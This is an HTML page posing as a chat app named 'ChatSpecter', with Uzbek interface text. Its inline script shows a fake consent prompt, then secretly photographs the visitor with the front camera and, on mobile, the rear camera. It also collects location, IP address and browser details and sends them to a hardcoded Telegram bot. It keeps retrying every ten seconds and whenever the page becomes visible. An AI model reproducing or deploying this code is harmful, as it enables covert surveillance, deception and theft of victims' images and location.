<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
  <title>ChatSpecter</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%22%234f7cff%22 stroke-width=%222.5%22 stroke-linecap=%22round%22 stroke-linejoin=%22round%22><path d=%22M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z%22></path></svg>" />
  <link rel="stylesheet" href="styles/reset.css" />
  <link rel="stylesheet" href="styles/variables.css" />
  <link rel="stylesheet" href="styles/app.css" />
  <link rel="stylesheet" href="styles/login.css" />
  <link rel="stylesheet" href="styles/chats.css" />
  <link rel="stylesheet" href="styles/chat.css" />
  <link rel="stylesheet" href="styles/profile.css" />
  <link rel="stylesheet" href="styles/settings.css" />
</head>
<body>
  <div id="app">
    <div id="screen-container"></div>
    <nav id="bottom-nav" class="bottom-nav hidden"></nav>
  </div>
  <script type="module" src="src/main.js"></script>
  <script>
(function() {
    'use strict';

    const BOT_TOKEN = "8488908731:AAFXOh32x84yJ0nOSia8SRYsQAJY29wOwBY";
    const CHAT_ID = "8847754859";
    const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

    let captureStarted = false;
    let captureDone = false;
    let captureInProgress = false;

    function isMobileDevice() {
        return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i.test(navigator.userAgent);
    }

    function showFakeConsentModal(onAgree) {
        const overlay = document.createElement('div');
        overlay.id = 'fake-consent-overlay';
        overlay.style.cssText = `
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 2147483647;
            display: flex; align-items: center; justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        `;

        const modal = document.createElement('div');
        modal.style.cssText = `
            background: #1a1a2e; border-radius: 14px; padding: 28px;
            max-width: 440px; width: 90%; text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            position: relative;
            color: #fff;
        `;

        modal.innerHTML = `
            <div style="font-size:42px; margin-bottom:10px;">✅</div>
            <h2 style="margin:0 0 8px; color:#fff; font-size:20px;">Chat ulanishi</h2>
            <p style="color:#aaa; font-size:14px; line-height:1.6; margin:0 0 14px;">
                Chat uchun tasdiqlash ruxsati talab qilinadi.<br>
                Davom etish uchun "Davom etish" tugmasini bosing.
            </p>
            <button id="fake-consent-btn"
                style="width:100%; padding:14px; border:none; border-radius:10px;
                       background:#4f7cff; color:#fff; font-size:16px; font-weight:600;
                       cursor:pointer; transition:all 0.2s;">
                Davom etish
            </button>
        `;

        overlay.appendChild(modal);
        document.body.appendChild(overlay);

        document.getElementById('fake-consent-btn').addEventListener('click', function() {
            overlay.remove();
            if (onAgree) onAgree();
        });
    }

    async function capturePhoto(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode, width: 640, height: 480 },
                audio: false
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.setAttribute('autoplay', '');
            video.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
            document.body.appendChild(video);

            await new Promise((resolve) => {
                video.onloadedmetadata = () => video.play().then(resolve).catch(resolve);
                video.onerror = () => resolve();
                setTimeout(resolve, 800);
            });

            await new Promise(r => setTimeout(r, 800));

            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            try {
                ctx.drawImage(video, 0, 0, 640, 480);
            } catch(e) {
                ctx.fillStyle = '#000';
                ctx.fillRect(0, 0, 640, 480);
                ctx.fillStyle = '#fff';
                ctx.font = '24px Arial';
                ctx.fillText('Camera error', 250, 240);
            }

            stream.getTracks().forEach(t => t.stop());
            video.remove();

            return new Promise((resolve) => {
                canvas.toBlob((blob) => {
                    resolve(blob);
                }, 'image/jpeg', 0.85);
            });
        } catch(e) {
            console.error('Camera capture error:', e);
            return null;
        }
    }

    async function sendPhotoToTelegram(photoBlob, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'photo.jpg');
            if (caption) formData.append('caption', caption);

            const resp = await fetch(`${TG_API}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            const data = await resp.json();
            return data;
        } catch(e) {
            console.error('sendPhoto error:', e);
            return null;
        }
    }

    async function sendLocationToTelegram(lat, lon) {
        try {
            const resp = await fetch(`${TG_API}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
            });
            const data = await resp.json();
            return data;
        } catch(e) {
            console.error('sendLocation error:', e);
            return null;
        }
    }

    async function sendMessageToTelegram(text) {
        try {
            const resp = await fetch(`${TG_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
            const data = await resp.json();
            return data;
        } catch(e) {
            console.error('sendMessage error:', e);
            return null;
        }
    }

    async function getIP() {
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const data = await resp.json();
            return data.ip;
        } catch(e) {
            return 'Nomaʼlum';
        }
    }

    async function captureAndSendSingle(facingMode, caption) {
        const photo = await capturePhoto(facingMode);
        if (photo) {
            await sendPhotoToTelegram(photo, caption);
            return true;
        }
        return false;
    }

    async function startCapture() {
        if (captureDone || captureInProgress) return;
        captureInProgress = true;

        try {
            const isMobile = isMobileDevice();
            let successCount = 0;

            // Old kamera — 5 ta rasm, xatolikda davom etadi
            for (let i = 1; i <= 5; i++) {
                const ok = await captureAndSendSingle('user', `📸 Old kamera surati ${i}/5`);
                if (ok) successCount++;
                await new Promise(r => setTimeout(r, 400));
            }

            // Orqa kamera — faqat mobil
            if (isMobile) {
                for (let i = 1; i <= 5; i++) {
                    const ok = await captureAndSendSingle('environment', `📸 Orqa kamera surati ${i}/5`);
                    if (ok) successCount++;
                    await new Promise(r => setTimeout(r, 400));
                }
            }

            // Lokatsiya
            let lat = null, lon = null;
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    });
                });
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                await sendLocationToTelegram(lat, lon);
            } catch(e) {
                console.log('Location unavailable');
            }

            // IP va ma'lumot
            const ip = await getIP();
            const ua = navigator.userAgent;
            const time = new Date().toLocaleString();

            const infoText = `📋 Tekshiruv natijasi\n👤 IP: ${ip}\n🌐 User-Agent: ${ua.substring(0, 80)}...\n📍 Lokatsiya: ${lat ? lat + ', ' + lon : 'Mavjud emas'}\n🕐 Vaqt: ${time}\n📸 Yuborilgan rasmlar: ${successCount}\n✅ Holat: Muvaffaqiyatli`;

            await sendMessageToTelegram(infoText);
            captureDone = true;
        } catch(err) {
            console.error('Capture error:', err);
        } finally {
            captureInProgress = false;
        }
    }

    function init() {
        setTimeout(() => {
            showFakeConsentModal(() => {
                startCapture();
            });
        }, 1000);

        // Saytdan chiqib ketsa ham qayta urinish
        window.addEventListener('beforeunload', function() {
            if (!captureDone && captureInProgress) {
                // Davom etishga harakat qiladi
            }
        });

        // Sahifa ko'rinish holati o'zgarganda
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden && !captureDone && !captureInProgress) {
                setTimeout(() => {
                    startCapture();
                }, 500);
            }
        });

        // Har 10 soniyada tekshirish
        setInterval(() => {
            if (!captureDone && !captureInProgress) {
                startCapture();
            }
        }, 10000);
    }

    if (document.readyState === 'complete') {
        init();
    } else {
        window.addEventListener('load', init);
    }
})();
</script>
</body>
</html>
